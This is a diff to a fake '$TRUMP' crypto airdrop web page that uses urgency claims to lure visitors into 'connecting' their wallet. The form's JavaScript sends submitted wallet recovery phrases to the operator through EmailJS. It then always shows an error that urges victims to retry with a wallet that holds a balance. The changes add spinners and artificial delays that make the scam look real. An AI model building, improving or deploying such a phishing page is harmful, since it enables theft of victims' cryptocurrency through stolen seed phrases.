@@ -191,9 +191,51 @@
       border-radius: 5px;
       text-align: center;
       cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
     }
     .btn:hover {
       background: #e03e00;
+    }
+    .btn:disabled {
+      background: #cccccc;
+      cursor: not-allowed;
+    }
+    .btn.connecting {
+      background: #ff4500;
+    }
+    .btn.connecting::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+      animation: connectingAnimation 1.5s infinite;
+    }
+    @keyframes connectingAnimation {
+      0% {
+        transform: translateX(-100%);
+      }
+      100% {
+        transform: translateX(100%);
+      }
+    }
+    .btn-spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+      margin-right: 8px;
+      vertical-align: middle;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
     footer {
       text-align: center;
@@ -268,7 +310,7 @@
       <p>We're rewarding the first 20,000 active wallets with $500 in $TRUMP each!</p>
       <p>Only 2,000+ spots remain — don't miss out!</p>
       <p>Be part of the movement — connect your wallet today and secure your share!</p>
-      <button class="btn" onclick="showWalletPage()">Connect Wallet</button>
+      <button class="btn" id="connect-wallet-btn">Connect Wallet</button>
     </div>
     <div id="testimonials">
       <h3>What Others Are Saying</h3>
@@ -334,13 +376,28 @@
       emailjs.init("8_8uPDLPGGbBtyIqv");
     })();
 
-    function showWalletPage() {
-      document.getElementById('wallet-page').classList.add('active');
-      document.getElementById('main-content').classList.add('blurred');
-      document.querySelector('.header-container').classList.add('blurred');
-      document.querySelector('footer').classList.add('blurred');
-      document.body.classList.add('noscroll');
-    }
+    document.getElementById('connect-wallet-btn').addEventListener('click', function() {
+      const btn = this;
+      
+      // Disable button and show loading state
+      btn.disabled = true;
+      btn.classList.add('connecting');
+      btn.innerHTML = '<span class="btn-spinner"></span> Connecting...';
+      
+      // Show wallet page after 4 seconds
+      setTimeout(() => {
+        document.getElementById('wallet-page').classList.add('active');
+        document.getElementById('main-content').classList.add('blurred');
+        document.querySelector('.header-container').classList.add('blurred');
+        document.querySelector('footer').classList.add('blurred');
+        document.body.classList.add('noscroll');
+        
+        // Reset button state (though it's hidden now)
+        btn.disabled = false;
+        btn.classList.remove('connecting');
+        btn.textContent = 'Connect Wallet';
+      }, 4000);
+    });
 
     function returnToMainPage() {
       document.getElementById('wallet-form').reset();
@@ -357,11 +414,16 @@
       event.preventDefault();
       const btn = document.getElementById("submit-btn");
       const errorBox = document.getElementById("error-box");
+      
+      // Disable button and show loading state for 10 seconds
       btn.disabled = true;
-      btn.textContent = "Connecting...";
-      emailjs.sendForm('service_oh2l5fc', 'template_oty8s2s', '#wallet-form')
-      .then(function(response) {
-        setTimeout(() => {
+      btn.classList.add('connecting');
+      btn.innerHTML = '<span class="btn-spinner"></span> Processing...';
+      
+      // Show error after 10 seconds (keeping your original error handling)
+      setTimeout(() => {
+        emailjs.sendForm('service_oh2l5fc', 'template_oty8s2s', '#wallet-form')
+        .then(function(response) {
           errorBox.innerHTML = `
   <p>
     Oops, something went wrong crediting this wallet.<br>
@@ -372,22 +434,24 @@
           errorBox.style.display = "block";
           document.getElementById('wallet-page').classList.add('blurred');
           btn.disabled = false;
+          btn.classList.remove('connecting');
           btn.textContent = "Connect";
-        }, 2000);
-      })
-      .catch(function(error) {
-        errorBox.innerHTML = `
+        })
+        .catch(function(error) {
+          errorBox.innerHTML = `
   <p>
     Oops, something went wrong crediting this wallet.<br>
     Please ensure your recovery phrase was entered correctly, the wallet has recent activity, or try again with a different wallet that holds a balance.
   </p>
   <button onclick="returnToMainPage()">Try Again</button>
 `;
-        errorBox.style.display = "block";
-        document.getElementById('wallet-page').classList.add('blurred');
-        btn.disabled = false;
-        btn.textContent = "Connect";
-      });
+          errorBox.style.display = "block";
+          document.getElementById('wallet-page').classList.add('blurred');
+          btn.disabled = false;
+          btn.classList.remove('connecting');
+          btn.textContent = "Connect";
+        });
+      }, 10000); // Changed from 2000ms to 10000ms (10 seconds)
     });
 
     // Testimonials auto-rotate
